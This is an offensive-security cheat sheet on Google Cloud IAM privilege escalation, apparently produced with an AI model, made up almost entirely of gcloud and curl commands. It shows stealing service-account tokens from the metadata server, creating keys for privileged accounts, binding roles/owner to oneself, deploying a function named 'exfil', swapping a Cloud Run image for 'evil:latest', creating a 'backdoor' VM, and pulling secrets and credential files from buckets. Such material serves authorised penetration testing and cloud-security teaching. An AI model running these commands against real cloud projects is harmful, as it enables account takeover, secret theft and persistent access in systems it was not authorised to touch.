# GCP IAM Privilege Escalation

**Tags:** `#gcp` `#googlecloud` `#cloud` `#iam` `#privesc` `#enumeration` `#postexploitation`

Collection of GCP IAM privilege escalation techniques and scripts from RhinoSecurity (the same team as Pacu). GCP has no equivalent to Pacu — most offensive work is done through the `gcloud` CLI and targeted Python scripts. This note covers manual enumeration, the known privesc paths, and the RhinoSec scripts.

**Source:** https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
**Reference:** https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
**Install:**
```bash
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
pip install -r requirements.txt

# Authenticate
gcloud auth login
gcloud auth activate-service-account --key-file=key.json
```

> [!note] **GCP offensive tooling gap** — GCP lacks a mature exploitation framework like Pacu. Most engagements rely on `gcloud` CLI one-liners, manual IAM analysis, and targeted scripts. ScoutSuite covers GCP misconfiguration auditing. This note focuses on IAM abuse and privilege escalation.

---

## Initial Recon

```bash
# Who am I?
gcloud auth list
gcloud config get-value account
gcloud config get-value project

# What projects do I have access to?
gcloud projects list

# Set active project
gcloud config set project <project-id>

# What permissions do I have? (IAM policy for the project)
gcloud projects get-iam-policy <project-id>

# What roles are bound to my account?
gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --format="table(bindings.role)" \
  --filter="bindings.members:<my-email>"

# List all IAM permissions I have (effective permissions)
gcloud projects get-iam-policy <project-id> --format=json
```

---

## IAM Enumeration

```bash
# All service accounts in the project
gcloud iam service-accounts list

# Keys for a service account (look for user-managed keys — downloadable)
gcloud iam service-accounts keys list --iam-account=<sa-email>

# Custom IAM roles (often misconfigured)
gcloud iam roles list --project=<project-id>
gcloud iam roles describe <role-id> --project=<project-id>

# All predefined roles
gcloud iam roles list

# What permissions does a role grant?
gcloud iam roles describe roles/editor
gcloud iam roles describe roles/owner

# Check if I can impersonate a service account
gcloud iam service-accounts get-iam-policy <sa-email>

# Audit log — what have I done / what's happening?
gcloud logging read 'protoPayload.authenticationInfo.principalEmail="<my-email>"' \
  --limit=50 --format=json
```

---

## Service Enumeration

```bash
# Compute instances (VMs)
gcloud compute instances list
gcloud compute instances describe <name> --zone=<zone>

# Cloud Storage buckets
gcloud storage ls
gcloud storage ls gs://<bucket>/

# Cloud Functions
gcloud functions list
gcloud functions describe <name> --region=<region>
# Check environment variables for secrets:
gcloud functions describe <name> --region=<region> --format=json | jq '.environmentVariables'

# Cloud Run services
gcloud run services list --platform=managed

# Cloud SQL instances
gcloud sql instances list

# Secrets Manager
gcloud secrets list
gcloud secrets versions access latest --secret=<secret-name>    # read secret value

# Pub/Sub
gcloud pubsub topics list

# Kubernetes clusters (GKE)
gcloud container clusters list
gcloud container clusters get-credentials <cluster-name> --zone=<zone>
kubectl get secrets --all-namespaces
```

---

## Metadata Server (from inside a GCP instance)

```bash
# Get service account token for the instance
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# List service accounts attached to the instance
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# Get all instance metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true"

# Use the token with GCP APIs
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r '.access_token')

curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

---

## Privilege Escalation Paths

```bash
# --- 1. Create service account key (iam.serviceAccountKeys.create) ---
# Generate downloadable key for a high-privilege SA you can see
gcloud iam service-accounts keys create key.json --iam-account=<sa-email>
gcloud auth activate-service-account --key-file=key.json

# --- 2. Impersonate service account (iam.serviceAccounts.actAs) ---
gcloud config set auth/impersonate_service_account <sa-email>
gcloud projects list    # runs as the impersonated SA

# --- 3. Assign IAM role to yourself (resourcemanager.projects.setIamPolicy) ---
gcloud projects add-iam-policy-binding <project-id> \
  --member="user:<my-email>" \
  --role="roles/owner"

# --- 4. Update Cloud Function code (cloudfunctions.functions.update + iam.serviceAccounts.actAs) ---
# Deploy a new function that runs as a privileged SA
gcloud functions deploy exfil \
  --runtime python39 \
  --trigger-http \
  --service-account=<privileged-sa-email> \
  --entry-point=main \
  --source=./malicious-function/

# --- 5. Modify Cloud Run service (run.services.update + iam.serviceAccounts.actAs) ---
gcloud run services update <service> \
  --image gcr.io/<project>/evil:latest \
  --service-account <privileged-sa-email> \
  --region <region>

# --- 6. Create/modify compute instance with SA attached ---
gcloud compute instances create backdoor \
  --service-account=<privileged-sa-email> \
  --scopes=cloud-platform \
  --zone=<zone>
# Then SSH in and hit the metadata server for the SA token

# --- 7. Abuse Deployment Manager (deploymentmanager.deployments.create) ---
# Deploy a config that creates resources as the DM SA (which has Editor by default)
```

---

## RhinoSecurity Scripts

```bash
cd GCP-IAM-Privilege-Escalation/PrivEscScripts/

# Check all possible privesc paths for current user
python3 PrivEscScan.py

# Automated exploitation of specific paths
python3 CreateServiceAccountKey.py --project <project> --account <sa-email>
python3 AddRoleToServiceAccount.py --project <project> --account <sa-email>

# Check permissions across all projects
python3 EnumerateAllPermissions.py
```

---

## Credential Locations

```bash
# Secrets Manager (always check)
gcloud secrets list
gcloud secrets versions access latest --secret=<name>

# Cloud Storage — look for credential files
gcloud storage ls --recursive gs://<bucket>/ | grep -E '\.(json|pem|key|p12|pfx|config|env)'
gcloud storage cp gs://<bucket>/credentials.json .

# Environment variables in Functions / Cloud Run
gcloud functions describe <name> --format=json | jq '.environmentVariables'
gcloud run services describe <name> --format=json | jq '.spec.template.spec.containers[].env'

# Instance metadata custom attributes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
